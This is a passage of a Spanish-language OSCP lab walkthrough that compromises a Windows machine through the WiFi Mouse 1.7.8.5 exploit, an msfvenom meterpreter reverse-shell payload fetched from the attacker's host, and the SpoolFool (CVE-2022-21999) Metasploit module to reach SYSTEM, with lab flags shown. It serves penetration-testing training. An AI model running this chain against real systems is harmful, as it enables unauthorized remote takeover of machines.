| **Web (IIS)**               | Revisar rutas, directorios y vulnerabilidades web                                                                            | `gobuster`, `nikto`, `wfuzz`                  |
| **RDP**                     | Probar enumeración de sesiones y fuerza bruta                                                                                | `crowbar`, `ncrack`                           |
| **SMB**                     | Acceso a shares, vulnerabilidades EternalBlue / SMBGhost si no está parchado                                                 | `smbmap`, `nmap --script smb-vuln*`           |

1. Buscamos exploits y CVE relacionado a **Mouse Server**

```bash
┌──(root㉿kali)-[/home/…/Challenges/4_OSCP-A/Standalone-Machines/145]
└─# searchsploit "Mouse Server 1.7.8.5"
------------------------------------- ---------------------------------
 Exploit Title                       |  Path
------------------------------------- ---------------------------------
WiFi Mouse 1.7.8.5 - Remote Code Exe | windows/remote/50972.py
------------------------------------- ---------------------------------
Shellcodes: No Results
```
2. Revisamos que el puerto habitual de este servicio este abierto:

```bash
┌──(root㉿kali)-[/home/…/Challenges/4_OSCP-A/Standalone-Machines/145]
└─# nmap -sV -p1978 192.168.205.145
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-11 18:02 -03
Nmap scan report for 192.168.205.145
Host is up (0.17s latency).

PORT     STATE SERVICE VERSION
1978/tcp open  unisql?
...

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 165.00 seconds
```
3. Levantamos un listener con **MSF** 

```bash
msf6 exploit(multi/handler) > set LHOST 192.168.45.152
LHOST => 192.168.45.152
msf6 exploit(multi/handler) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
PAYLOAD => windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > run -j
[*] Exploit running as background job 1.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 192.168.45.152:4444
```

4. Generamos un mirror del exploit y lo ejecutamos

> Debemos tener un servidor en ejecucion para servir el payload met.exe, previamente generado:

```bash
┌──(root㉿kali)-[/home/…/Challenges/4_OSCP-A/Standalone-Machines/145]
└─# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.45.152 LPORT=4444 -f exe -o met.exe
```
---

```bash
┌──(root㉿kali)-[/home/…/Challenges/4_OSCP-A/Standalone-Machines/145]
└─# searhsploit -m 50972
┌──(root㉿kali)-[/home/…/Challenges/4_OSCP-A/Standalone-Machines/145]
└─# python 50972.py 192.168.205.145 192.168.45.152 met.exe 
[+] 3..2..1..
[+] *Super fast hacker typing*
[+] Retrieving payload
[+] Done! Check Your Listener?
```
5. En nuestro receptor:

```bash
msf6 exploit(multi/handler) > [*] Sending stage (203846 bytes) to 192.168.205.145
[*] Meterpreter session 2 opened (192.168.45.152:4444 -> 192.168.205.145:54028) at 2025-08-11 18:16:57 -0300
sessions

Active sessions
===============

  Id  Name  Type                     Information         Connection
  --  ----  ----                     -----------         ----------
  2         meterpreter x64/windows  OSCP\offsec @ OSCP  192.168.45.152:4444 -> 192.168.205.145:54028 (192.168.205.145)

msf6 exploit(multi/handler) > 
```

6. Obtenemos el local flag:

```bash
msf6 exploit(multi/handler) > sessions -i 2
[*] Starting interaction with 2...

meterpreter > shell
Process 4948 created.
Channel 1 created.
Microsoft Windows [Version 10.0.19041.1]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32>cd C:\Users 
cd C:\Users

C:\Users>dir 
dir
 Volume in drive C has no label.
 Volume Serial Number is 2879-D413

 Directory of C:\Users

08/11/2025  05:35 AM    <DIR>          .
08/11/2025  05:35 AM    <DIR>          ..
01/06/2023  12:52 AM    <DIR>          Administrator
08/11/2025  05:35 AM    <DIR>          DefaultAppPool
01/05/2023  06:10 AM    <DIR>          offsec
01/05/2023  06:04 AM    <DIR>          Public
01/05/2023  06:08 AM    <DIR>          zachary
               0 File(s)              0 bytes
               7 Dir(s)   9,158,774,784 bytes free


 Directory of C:\Users\offsec\Desktop

01/05/2023  06:10 AM    <DIR>          .
01/05/2023  06:10 AM    <DIR>          ..
08/11/2025  05:28 AM                34 local.txt
               1 File(s)             34 bytes
               2 Dir(s)   9,158,774,784 bytes free

C:\Users\offsec\Desktop>type local.txt
type local.txt
684c5753bac9ce1c5f4096d8e7e08247

C:\Users\offsec\Desktop>
```
### Escalamos Privilegios

> De la misma session meterpreter obtenemos del suggester un posible exploit para escalar privilegios

```bash
msf6 post(multi/recon/local_exploit_suggester) > use exploit/windows/local/cve_2022_21999_spoolfool_privesc
[*] Using configured payload windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/local/cve_2022_21999_spoolfool_privesc) > options

Module options (exploit/windows/local/cve_2022_21999_spoolfool_privesc):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PATH       %TEMP%           yes       Path to hold the payload
   SESSION                     yes       The session to run this module on
   WAIT_TIME  5                yes       Time to wait in seconds for spooler to restart


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST                      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Auto



View the full module info with the info, or info -d command.

msf6 exploit(windows/local/cve_2022_21999_spoolfool_privesc) > set LHOST 192.168.45.152
LHOST => 192.168.45.152
msf6 exploit(windows/local/cve_2022_21999_spoolfool_privesc) > set LPORT 4445
LPORT => 4445
msf6 exploit(windows/local/cve_2022_21999_spoolfool_privesc) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
PAYLOAD => windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/local/cve_2022_21999_spoolfool_privesc) > set SESSION 2
SESSION => 2
msf6 exploit(windows/local/cve_2022_21999_spoolfool_privesc) > run
[*] Started reverse TCP handler on 192.168.45.152:4445 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable.
[*] Making base directory: C:\Users\offsec\AppData\Local\Temp\macgzTVJ
[+] Printer PXKOHPAyKTSn was successfully added.
[*] Setting spool directory: \\localhost\C$\Users\offsec\AppData\Local\Temp\macgzTVJ\4
[*] Creating junction point: C:\Users\offsec\AppData\Local\Temp\macgzTVJ -> C:\Windows\System32\spool\drivers\x64
[*] Creating the spool directory by restarting spooler...
[*] Attempting to restart print spooler.
[*] Sleeping for 5 seconds.
[+] Directory was successfully created.
[*] Writing payload to C:\Windows\System32\spool\drivers\x64\4\MLBnEZeUzKY.dll.
[*] Attempting to set permissions for payload.
[*] Payload should have read / execute permissions now.
[*] Sending stage (203846 bytes) to 192.168.205.145
[+] Deleted C:\Windows\System32\spool\drivers\x64\4\MLBnEZeUzKY.dll
[+] Deleted C:\Users\offsec\AppData\Local\Temp\macgzTVJ
[+] Deleted C:\Windows\System32\spool\drivers\x64\4
[*] Meterpreter session 3 opened (192.168.45.152:4445 -> 192.168.205.145:54078) at 2025-08-11 18:31:03 -0300

meterpreter > shell
Process 5236 created.
Channel 2 created.
Microsoft Windows [Version 10.0.19041.1]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32>whoami
whoami
nt authority\system

C:\WINDOWS\system32>cd C:\Users\Administrator
cd C:\Users\Administrator

C:\Users\Administrator>cd Desktop
cd Desktop

C:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 2879-D413

 Directory of C:\Users\Administrator\Desktop

01/06/2023  12:53 AM    <DIR>          .
01/06/2023  12:53 AM    <DIR>          ..
08/11/2025  05:28 AM                34 proof.txt
               1 File(s)             34 bytes
               2 Dir(s)   9,158,402,048 bytes free

C:\Users\Administrator\Desktop>type proof.txt
type proof.txt
b7529fafac086e6f438068c6442f3da2

C:\Users\Administrator\Desktop>
```
## Troubleshooting

## Herramientas Alternativas
- [ ] **Herramienta 1:** Descripción breve (Comando)
- [ ] **Herramienta 2:** Descripción breve (Comando)
- [ ] **Herramienta 3:** Descripción breve (Comando)

